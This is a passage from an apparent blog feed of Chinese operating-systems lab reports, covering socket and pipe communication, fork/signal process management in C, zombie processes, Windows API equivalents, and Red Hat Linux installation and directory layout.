big-endian */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (connect(sockfd, (<span class="keyword">struct</span> sockaddr*) &amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    report(<span class="string">"connect"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Write some stuff and read the echoes. */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Connect to server, about to write some stuff..."</span>);</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ConversationLen; i++) {</span><br><span class="line">    <span class="keyword">if</span> (write(sockfd, books[i], <span class="built_in">strlen</span>(books[i])) &gt; <span class="number">0</span>) {</span><br><span class="line">      <span class="comment">/* get confirmation echoed from server and print */</span></span><br><span class="line">      <span class="type">char</span> buffer[BuffSize + <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span> (read(sockfd, buffer, <span class="keyword">sizeof</span>(buffer)) &gt; <span class="number">0</span>) <span class="built_in">puts</span>(buffer);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Client done, about to exit..."</span>);</span><br><span class="line">  close(sockfd); <span class="comment">/* close the connection */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></div></div> 主要利用了C的`socket`通信函数来实现文件通信。先运行server，再运行client，结果如下。
<img data-src="/2019/11/24/experiments/oskernel/process-communication/10.png" class="">
<p>Server 开启了 9876 号端口的监听，接收 client 端向服务器写入信息，server 端会向 client 端回应所写入的内容，client 端写入完成，就会退出。</p>
<p>此时查看 <code>netstat</code> 状态，会发现 server 端的 9876 号端口在监听任意地址。</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/11.png" class="">
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>本次实验主要为给定文件，运行可执行程序并对执行结果进行解释。通过运行给定的示例程序，我对于进程的同步有了更深层的认识，明白了信号量和锁机制的使用对于同步编程的正确性来说是个很重要的保证。同时，也学习到了一些 Linux 系统头文件中自带的一些同步函数。</p>
<h2 id="实验思考">实验思考</h2>
<p>Server 和 client 的 socket 通信过程是否也是文件通信的一种形式？文件描述符是由 socket 函数获得的，我们能不能在 linux 系统中找到相应的文件呢？</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>操作系统内核</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>进程通信</tag>
      </tags>
  </entry>
  <entry>
    <title>进程管理实验</title>
    <url>/2019/10/12/experiments/oskernel/process-management/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>本次实验主要进行了进程有关的实验，利用 Linux 下的系统 API——<code>fork()</code> 函数来在 Linux 下创建一个新的进程，运行一个小程序来观察进程的争用资源和互相通信的现象。</p>
<span id="more"></span>
<h2 id="实验步骤">实验步骤</h2>
<h3 id="进程的软中断通信">进程的软中断通信</h3>
<div class="note primary"><h4 id="要求">要求</h4>
<p>使用系统调用 <code>fork()</code> 创建两个子进程，再用系统调用 <code>signal()</code> 让父进程捕捉键盘上来的中断信号（即按<kbd> Delete</kbd> 键），当父进程接受到这两个软中断的其中某一个后，父进程用系统调用 <code>kill()</code> 向两个子进程分别发送整数值为 16 和 17 软中断信号，子进程获得对应软中断信号后，分别输出下列信息后终止：</p>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">Child process 1 is killed by parent!!</span><br><span class="line">Child process 2 is killed by parent!!</span><br></pre></td></tr></tbody></table></figure>
<p>父进程调用 <code>wait()</code> 函数等待两个子进程终止后，输出以下信息后终止:</p>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">Parent process is killed!!</span><br></pre></td></tr></tbody></table></figure>
</div>
<div class="tabs" id="res1"><ul class="nav-tabs"><li class="tab active"><a href="#res1-1"><i class="fa fa-code"></i>源代码</a></li><li class="tab"><a href="#res1-2"><i class="fa fa-check"></i>运行结果</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res1-1"><figure class="highlight c"><figcaption><span>process.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> wait_flag;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="type">int</span> pid1,pid2;</span><br><span class="line">	signal(<span class="number">3</span>,stop);</span><br><span class="line">	<span class="keyword">while</span>((pid1=fork())&lt;<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(pid1&gt;<span class="number">0</span>){</span><br><span class="line">		<span class="keyword">while</span>((pid2=fork())&lt;<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(pid2&gt;<span class="number">0</span>){</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"----\npid1:%d\npid2:%d\n\n----"</span>,pid1,pid2);</span><br><span class="line">			wait_flag=<span class="number">1</span>;</span><br><span class="line">			sleep(<span class="number">5</span>);</span><br><span class="line">			kill(pid1,<span class="number">16</span>);</span><br><span class="line">			kill(pid2,<span class="number">17</span>);</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n Parent process is killed!\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span>{</span><br><span class="line">			wait_flag = <span class="number">1</span>;</span><br><span class="line">			signal(<span class="number">17</span>,stop);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n Child process 2 is killed by parent!\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		}</span><br><span class="line">	}<span class="keyword">else</span>{</span><br><span class="line">		wait_flag=<span class="number">1</span>;</span><br><span class="line">		signal(<span class="number">16</span>,stop);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n Child process 1 is killed by parent!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">stop</span><span class="params">()</span>{</span><br><span class="line">	wait_flag=<span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="res1-2"><img data-src="/2019/10/12/experiments/oskernel/process-management/00.png" class=""></div></div></div>
<h3 id="进程的管道通信">进程的管道通信</h3>
<div class="note primary"><h4 id="要求">要求</h4>
<p>使用系统调用 <code>pipe()</code> 建立一条管道线，两个子进程分别向管道写一句话:</p>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">Child process 1 is sending a message!</span><br><span class="line">Child process 2 is sending a message!</span><br></pre></td></tr></tbody></table></figure>
<p>而父进程则从管道中读出来自于两个子进程的信息，显示在屏幕上。父进程先接收子进程 P1 发来的消息，然后再接收子进程 P2 发来的消息。</p>
</div>
<div class="tabs" id="res2"><ul class="nav-tabs"><li class="tab active"><a href="#res2-1"><i class="fa fa-code"></i>源代码</a></li><li class="tab"><a href="#res2-2"><i class="fa fa-check"></i>运行结果</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res2-1"><figure class="highlight c"><figcaption><span>pipe.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> pid1,pid2;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="type">char</span> outpipe[<span class="number">100</span>],inpipe[<span class="number">100</span>];</span><br><span class="line">	pipe(fd);</span><br><span class="line">	<span class="keyword">while</span>((pid1=fork())== <span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span>(pid1==<span class="number">0</span>){</span><br><span class="line">		lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>); <span class="comment">//lock the pipe</span></span><br><span class="line">		<span class="built_in">sprintf</span>(outpipe,<span class="string">"\nChild process 1 is sending message!\n"</span>);</span><br><span class="line">		write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">		sleep(<span class="number">5</span>);         <span class="comment">//wait for read process</span></span><br><span class="line">		lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>); <span class="comment">//unlock the pipe</span></span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span>{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\npid1:%d\n"</span>,pid1);</span><br><span class="line">		<span class="keyword">while</span>((pid2=fork())== <span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">if</span>(pid2==<span class="number">0</span>){</span><br><span class="line">			lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="built_in">sprintf</span>(outpipe,<span class="string">"\nChild process 2 is sending message!\n"</span>);</span><br><span class="line">			write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">			sleep(<span class="number">5</span>);</span><br><span class="line">			lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span>{</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\npid2:%d\n"</span>,pid2);</span><br><span class="line">			wait(<span class="number">0</span>);  <span class="comment">//wait for child process 1</span></span><br><span class="line">			read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,inpipe);</span><br><span class="line">			wait(<span class="number">0</span>);  <span class="comment">//wait for child process 2</span></span><br><span class="line">			read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,inpipe);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);  <span class="comment">//parent process terminated</span></span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="res2-2"><img data-src="/2019/10/12/experiments/oskernel/process-management/2.png" class=""></div></div></div>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<h3 id="进程的软中断通信-2">进程的软中断通信</h3>
<p>前面的运行结果中，虽然 <code>pid1</code> 总是小于 <code>pid2</code>，但是两个进程结束的顺序总是不一样的。我们来把程序后台运行一下，观察程序中所有的 <code>pid</code> 值和行为。</p>
<img data-src="/2019/10/12/experiments/oskernel/process-management/0.png" class="">
<img data-src="/2019/10/12/experiments/oskernel/process-management/1.png" class="">
<p>我们运行了 <code>ps -aux</code> 命令来查看系统中的后台进程，在最下方找到了 <code>process</code> 进程，其父进程 <code>pid</code> 为 4473，而两个子进程 <code>pid</code> 分别为 4475 和 4476。</p>
<p>之所以两个进程结束的顺序不同，是因为 <code>kill</code> 发出的信号没有被及时处理或可能被封锁。虽然调用 <code>kill</code> 的顺序是先 1 后 2，但是发送的都是软中断信号，它们都需要等待所有相关资源的释放。而释放的顺序是不确定的，由于存在资源争夺，信号接受的先后也是不确定的。</p>
<p>观察它们在后台表现的程序名发现，它们都是由中括号括起的，后面有一个 <code>defunct</code> 标志，同时又显示为 "Z" 状态，表明此进程为僵尸进程，直接 <code>kill</code> 其 <code>pid</code> 将不会奏效。需要对其父进程 <code>pid</code> 进行 <code>kill</code> 操作，才可以正确结束进程。</p>
<h3 id="进程的管道通信-2">进程的管道通信</h3>
<p>仍然将程序置于后台运行，观察后台 <code>pid</code> 和行为。</p>
<img data-src="/2019/10/12/experiments/oskernel/process-management/3.png" class=""> <img data-src="/2019/10/12/experiments/oskernel/process-management/4.png" class="">
<p>以上后台输出表明，在管道通信时，实质上启动了三个 <code>pipe</code> 进程，其中一个是父进程，它开启了下面的两个子进程，并监听管道中子进程传达的消息。在这个过程中，进程均为 "S" 状态，为休眠状态。</p>
<div class="note info"><p>那为什么每次运行程序时，子进程发送信息的先后总是不同呢？这其中应该也存在资源的争用问题。虽然 <code>pid1</code> 的创建一定早于 <code>pid2</code>，但是调用 <code>lockf</code> 的先后顺序是不一定的，如果子进程 1 率先执行到 <code>lockf(fd[1],1,0)</code>，那么它将先阻塞管道，把信息传入管道中，供父进程读出并打印在终端中。子进程 2 此时即使创建成功，有 <code>pid</code> 号，但是因为管道被阻塞，无法进入管道，故阻塞在它的 <code>lockf(fd[1],1,0)</code> 语句中，等到子进程 1 释放管道时，才可进入管道。反之相似。</p>
</div>
<h2 id="实验难点与收获">实验难点与收获</h2>
<ul>
<li>这次的实验步骤不是很多，主要难点在于编程和对进程资源争用的理解上。</li>
<li>掌握了 Linux 下进程管理相关的 C 语言 API。</li>
<li>对于进程的并发执行有了更深层次的理解。</li>
</ul>
<h2 id="实验思考">实验思考</h2>
<p>子进程的结束和父进程的运行是一个异步过程，即父进程永远无法预测子进程到底什么时候结束。那么会不会因为父进程太忙来不及 <code>wait</code> 子进程，或者说不知道子进程什么时候结束，而丢失子进程结束时的状态信息呢？</p>
<p>查阅资料得知：“不会。因为 Linux 提供了一种机制可以保证，只要父进程想知道子进程结束时的状态信息，就可以得到。这种机制就是：当子进程走完了自己的生命周期后，它会执行 <code>exit()</code> 系统调用，内核释放该进程所有的资源，包括打开的文件，占用的内存等。但是仍然为其保留一定的信息 (包括进程号、退出码、退出状态、运行时间等)，这些数据会一直保留到系统将它传递给它的父进程为止，直到父进程通过 <code>wait</code> / <code>waitpid</code> 来取时才释放。</p>
<p>也就是说，当一个进程死亡时，它并不是完全的消失了。进程终止，它不再运行，但是还有一些残留的数据等待父进程收回。当父进程 <code>fork()</code> 一个子进程后，它必须用 <code>wait()</code> (或者 <code>waitpid()</code>) 等待子进程退出。正是这个 <code>wait()</code> 动作来让子进程的残留数据消失。”</p>
<p>根据这个资料，我想到了一个问题：假如进程通信代码中去掉父进程的 <code>wait</code> 调用，<code>fork</code> 出来的两个子进程还能正确结束吗？</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/12/experiments/oskernel/process-management/5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/12/experiments/oskernel/process-management/6.png" class=""></div></div></div>
<p>仍然正确地结束了两个进程。出现这样的现象可能是因为 Linux 系统中有一些特殊的机制来保证 “僵尸进程” 被正确地接管 (具体来说，由 init 进程来接管，其 pid 为 1)。</p>
<h3 id="Windows对应的API">Windows 对应的 API</h3>
<div class="tabs" id="windowsapi"><ul class="nav-tabs"><li class="tab active"><a href="#windowsapi-1"><code>createProcess</code></a></li><li class="tab"><a href="#windowsapi-2"><code>WaitForSingleObject</code></a></li><li class="tab"><a href="#windowsapi-3"><code>ExitProcess</code></a></li><li class="tab"><a href="#windowsapi-4">信号机制</a></li><li class="tab"><a href="#windowsapi-5"><code>TerminateProcess</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="windowsapi-1"><p>对应于 Linux 的 <code>fork()</code>API</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCTSTR lpApplicationName,        <span class="comment">//指向一个NULL结尾的、用来指定可执行模块的字符串。</span></span></span><br><span class="line"><span class="params">    LPTSTR lpCommandLine,        <span class="comment">//指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。</span></span></span><br><span class="line"><span class="params">    LPSECURITY_ATTRIBUTES lpProcessAttributes。<span class="comment">//指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。如果lpProcessAttributes参数为空（NULL），那么句柄不能被继承。</span></span></span><br><span class="line"><span class="params">    LPSECURITY_ATTRIBUTES lpThreadAttributes,        <span class="comment">//同lpProcessAttribute，不过这个参数决定的是线程是否被继承，通常置为NULL。</span></span></span><br><span class="line"><span class="params">    BOOL bInheritHandles,       <span class="comment">//指示新进程是否从调用进程处继承了句柄。</span></span></span><br><span class="line"><span class="params">    DWORD dwCreationFlags,  <span class="comment">//指定附加的、用来控制优先类和进程的创建的标志。</span></span></span><br><span class="line"><span class="params">    LPVOID lpEnvironment,        <span class="comment">//指向一个新进程的环境块。如果此参数为空，新进程使用调用进程的环境。</span></span></span><br><span class="line"><span class="params">    LPCTSTR lpCurrentDirectory,        <span class="comment">//指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径。</span></span></span><br><span class="line"><span class="params">    LPSTARTUPINFO lpStartupInfo,        <span class="comment">//指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。</span></span></span><br><span class="line"><span class="params">    LPPROCESS_INFORMATION lpProcessInformation  <span class="comment">//指向一个用来接收新进程的识别信息的PROCESS_INFORMATION结构体。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="windowsapi-2"><p>对应于 Linux 的 <code>waitpid()</code></p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">WaitForSingleObject</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hHandle,   <span class="comment">//线程的Handle</span></span></span><br><span class="line"><span class="params">DWORDdwMilliseconds  <span class="comment">// 相应的Timeout时间</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="windowsapi-3"><p>对应于 <code>exit()</code></p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ExitProcess</span><span class="params">(UINT uExitCode)</span>;</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="windowsapi-4"><p>Windows 也使用 <code>signal.h</code> 并也有 <code>signal</code> 函数作为信号控制函数。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl *<span class="title function_">signal</span><span class="params">(<span class="type">int</span> sig, <span class="type">int</span> (*func)(<span class="type">int</span>, <span class="type">int</span>))</span></span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="windowsapi-5"><p>有关进程终止，Windows 使用 <code>TerminateProcess</code> 函数</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">TerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess,  <span class="comment">//要终止(杀死)进程的句柄，需要有PROCESS_TERMINATE权限。</span></span></span><br><span class="line"><span class="params">UINT uExitCode  <span class="comment">//设置进程的退出值。可通过GetExitCodeProcess函数得到一个进程的退出值。</span></span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></tbody></table></figure></div></div></div>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>进程管理</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>进程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Red Hat Linux 的安装和使用</title>
    <url>/2019/09/26/experiments/oskernel/using-rhel-and-gcc/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>本次实验主要熟悉了 Linux 的一个发行版 ——<code>Red Hat Linux</code> 的安装及使用。在安装过程中，我也查阅了一些资料，了解到了这个系统的一些细节和常用操作。为之后的进程管理等实验创建好实验环境和平台。</p>
<p>本次还进行了 gcc 编译器的安装，安装编译器的过程中，我了解了 <code>Red Hat Linux</code> 下软件安装的一般方法 ——<code>rpm</code>，也了解到一些库的安装可能依赖于另外的一些库，从而需要提前安装上其他库。了解 <code>gcc</code> 编译器，作为编译<code>.c</code> 文件的一个工具，在今后在 Linux 系统下的 C 程序编程中会起到至关重要的作用。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="安装Red-Hat-Linux">安装 Red Hat Linux</h3>
<div class="note info"><h4 id="本次实验用到的rhel版本">本次实验用到的 rhel 版本</h4>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/%E9%99%842.png" class="" width="400" title="RHEL版本" alt="RHEL版本截图"> </div>
<p>为锻炼好日后独立装载操作系统的能力，本次安装使用基于 VMware 虚拟机的手动安装方法，在网络上下载好 rhel7.2 版本的光盘镜像，然后使用光盘加载到虚拟机中，修改 BIOS 为光盘启动优先，以开启手动安装。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-1.png" class="">
<p>配置过程不再详述。此过程其他截图至实验报告 3.1 节中查看。 安装结束后，重启进入系统。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/0-10.png" class="" title="系统界面" alt="系统界面截图">
<h3 id="Linux文件系统">Linux 文件系统</h3>
<h4 id="Linux目录结构">Linux 目录结构</h4>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/2-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/2-2.png" class=""></div></div></div>
<p>进入系统后，我们可以看到根目录中都有一些什么文件夹。点击桌面的家目录，然后单击左侧的 “计算机”，或者借用命令 <code>ls /</code> 就可以看到。其中有 <code>/bin</code>，<code>/boot</code>，<code>/dev</code>，<code>/etc</code>，<code>/home</code>，<code>/lib</code>，<code>/lib64</code>，<code>/media</code>，<code>/mnt</code>，<code>/opt</code>，<code>/proc</code>，<code>/root</code>，<code>/run</code>，<code>/sbin</code>，<code>/srv</code>，<code>/sys</code>，<code>/tmp</code>，<code>/usr</code>，<code>/var</code> 这么多目录，它们的作用简单介绍如下：</p>
<div class="tabs" id="linux-folders"><ul class="nav-tabs"><li class="tab active"><a href="#linux-folders-1">/bin</a></li><li class="tab"><a href="#linux-folders-2">/boot</a></li><li class="tab"><a href="#linux-folders-3">/dev</a></li><li class="tab"><a href="#linux-folders-4">/etc</a></li><li class="tab"><a href="#linux-folders-5">/boot</a></li><li class="tab"><a href="#linux-folders-6">/home</a></li><li class="tab"><a href="#linux-folders-7">/lib</a></li><li class="tab"><a href="#linux-folders-8">/media</a></li><li class="tab"><a href="#linux-folders-9">/mnt</a></li><li class="tab"><a href="#linux-folders-10">/opt</a></li><li class="tab"><a href="#linux-folders-11">/proc</a></li><li class="tab"><a href="#linux-folders-12">/root</a></li><li class="tab"><a href="#linux-folders-13">/run</a></li><li class="tab"><a href="#linux-folders-14">/sbin</a></li><li class="tab"><a href="#linux-folders-15">/srv</a></li><li class="tab"><a href="#linux-folders-16">/sys</a></li><li class="tab"><a href="#linux-folders-17">/tmp</a></li><li class="tab"><a href="#linux-folders-18">/usr</a></li><li class="tab"><a href="#linux-folders-19">/var</a></li></ul><div class="tab-content"><div class="tab-pane active" id="linux-folders-1"><p>存放二进制可执行文件，Linux 系统的常用命令（<code>ls</code>、<code>mkdir</code>、<code>cp</code> 等）就在其中。</p></div><div class="tab-pane" id="linux-folders-2"><p>存放用于 Linux 系统引导时使用的各种文件。</p></div><div class="tab-pane" id="linux-folders-3"><p>存放设备文件，在 Linux 下，“万物皆文件”，所有的外部设备对应了 <code>dev</code> 下的一个文件，例如 <code>dev/sdax</code> 对应了系统下的第一块硬盘的第 x 个分区。</p></div><div class="tab-pane" id="linux-folders-4"><p>存放系统管理与配置文件。</p></div><div class="tab-pane" id="linux-folders-5"><p>存放用于 Linux 系统引导时使用的各种文件。</p></div><div class="tab-pane" id="linux-folders-6"><p>所有非 root 用户文件的根目录，用户 “家目录” 为 <code>/home/&lt;用户名&gt;</code>，可以用 <code>~</code> 表示。</p></div><div class="tab-pane" id="linux-folders-7"><p>存放跟文件系统中的程序运行所需要的共享库及内核模块。共享库又叫动态链接共享库，作用类似 windows 里的<code>.dll</code> 文件，存放了根文件系统程序运行所需的共享文件。</p>
<div class="note info"><p>RedHat 中 <code>/lib</code> 里面是 32 位的库，<code>/lib64</code> 里面是 64 位的库。</p>
</div></div><div class="tab-pane" id="linux-folders-8"><p>是挂载多媒体设备的目录，如默认情况下的光盘、优盘、硬盘等设备都挂载在此目录。</p></div><div class="tab-pane" id="linux-folders-9"><p>一般挂载镜像和硬盘一类的目录。</p></div><div class="tab-pane" id="linux-folders-10"><p>额外安装的可选应用程序包所放置的位置。</p></div><div class="tab-pane" id="linux-folders-11"><p>虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息。</p></div><div class="tab-pane" id="linux-folders-12"><p>系统超级管理员的用户主目录。</p></div><div class="tab-pane" id="linux-folders-13"><p>内有很多 pid 文件，表示当前系统运行中的进程。pid 文件中存储了进程号，可以用于 <code>kill</code> 等操作。</p></div><div class="tab-pane" id="linux-folders-14"><p>superuser binary，存放系统管理员所使用的管理程序。</p></div><div class="tab-pane" id="linux-folders-15"><p>主要用来存储本机或本服务器提供的服务或数据。</p></div><div class="tab-pane" id="linux-folders-16"><p>包括系统所有的硬件信息以及内核模块等信息。</p></div><div class="tab-pane" id="linux-folders-17"><p>系统产生临时文件的存放目录。</p></div><div class="tab-pane" id="linux-folders-18"><p>usr 是 Unix Software Resource 的缩写， 也就是 Unix 操作系统。软件资源所放置的目录，而不是用户的数据；所有系统默认的软件都会放置到 <code>/usr</code>。</p></div><div class="tab-pane" id="linux-folders-19"><p><code>/var</code> 包含系统一般运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化或扩充的。原来 <code>/var</code> 目录中有些内容是在 <code>/usr</code> 中的，但为了保持 /usr 目录的相对稳定，就把那些需要经常改变的目录放到 <code>/var</code> 中了。</p></div></div></div>
<h4 id="Linux目录功能">Linux 目录功能</h4>
<div class="note info"><p>提前在 <code>mnt</code> 目录下创建好了 <code>usb</code> 文件夹。</p>
</div> 
<p>向虚拟机插入 U 盘后，<code>fdisk -l</code> 有了一些额外的输出，是这样的</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-3.png" class=""></div></div></div> 
<p>其中，<code>dev/sdb</code> 应该就是插入的 U 盘。</p>
<div class="note info"><p>实际上，此时操作系统中已经可以看到这个 U 盘了。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-4.png" class=""></p>
</div>
<div class="note warning"><p>再运行 <code>mount</code> 命令已经没有作用了<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-1.png" class=""></p>
</div>
<p>可以看到，它实际上已经挂载到了 <code>/run/media/root/设备号</code>文件夹下。桌面上已经有了盘符显示。</p>
<p>再运行 <code>unmount</code> 命令卸载 U 盘，桌面移动盘图标会消失。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-5-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/3-5-1.png" class=""></div></div></div>
<h4 id="Linux系统基本命令行操作">Linux 系统基本命令行操作</h4>
<div class="tabs" id="linux-commands"><ul class="nav-tabs"><li class="tab active"><a href="#linux-commands-1">关机与重启 shutdown</a></li><li class="tab"><a href="#linux-commands-2">文件与目录操作</a></li><li class="tab"><a href="#linux-commands-3">打包与解包，压缩与解压</a></li><li class="tab"><a href="#linux-commands-4">Linux 系统管理</a></li><li class="tab"><a href="#linux-commands-5">其他命令</a></li></ul><div class="tab-content"><div class="tab-pane active" id="linux-commands-1"><div class="note primary"><p>格式：<code>shutdown [option] time [warning]</code></p>
</div> 
